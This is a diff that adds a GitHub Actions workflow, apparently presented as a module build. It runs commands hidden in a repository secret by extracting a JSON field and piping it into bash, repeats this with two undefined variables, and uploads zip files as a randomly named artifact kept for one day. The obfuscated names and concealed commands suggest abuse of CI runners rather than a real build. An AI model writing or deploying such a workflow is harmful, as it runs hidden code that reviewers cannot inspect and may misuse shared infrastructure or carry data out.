@@ -1,0 +1,23 @@
+name: makemodule773
+on:
+  workflow_dispatch:
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: makemodule773
+        env:
+          tsr46936: ${{ secrets.tsr46936 }}
+        run: |
+          printf '%s' "$tsr46936" | jq -r .lsg968 | /bin/bash
+          echo $bvxp347 | jq -r .yp2022 | /bin/bash
+          echo $xzx8 | jq -r .j01055 | /bin/bash
+
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: dUNbsKjR
+          path: "*.zip"
+          retention-days: 1
